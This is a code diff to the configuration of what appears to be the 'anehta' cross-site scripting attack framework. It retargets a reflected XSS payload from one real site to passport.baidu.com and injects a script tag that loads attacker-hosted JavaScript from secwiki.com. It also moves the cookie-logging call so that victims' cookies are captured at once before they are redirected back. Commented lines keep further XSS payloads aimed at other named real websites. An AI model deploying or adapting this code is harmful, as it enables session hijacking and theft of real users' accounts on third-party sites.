@@ -9,14 +9,15 @@
 
 
 ////////////////////////////////////////////////////////////
-var target_domain = "www.underwoodlandcompany.com";
+var target_domain = "passport.baidu.com";
+var target="http://passport.baidu.com/?getmypass&username=\"];document.write('<script src=http://www.secwiki.com/anehta/feed.js></script>');//";
 //var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
-var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
+//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
 //var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
 //var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
 
 // 前页面
-var org_url = "http://www.secwiki.com/anehta/test.html";
+var org_url = "http://www.secwiki.com/anehta/demo.html";
 var org_domain = "www.secwiki.com";
 //var org_url = "http://www.b.com/anehta/test.html";
 //var org_domain = "www.b.com";
@@ -43,12 +44,10 @@ if ($d.domain == org_domain){
 
 // 如果是目标站点，则重定向回前页面 
 if ($d.domain == target_domain){
-	 
+	
+	//clx模块太慢了
+	 anehta.logger.logCookie();
 	 setTimeout( function (){
-	 	 //clx模块太慢了
-     anehta.logger.logCookie();
-
-
      // 弹回原来的页面。
      anehta.net.postForm(org_url);
    },
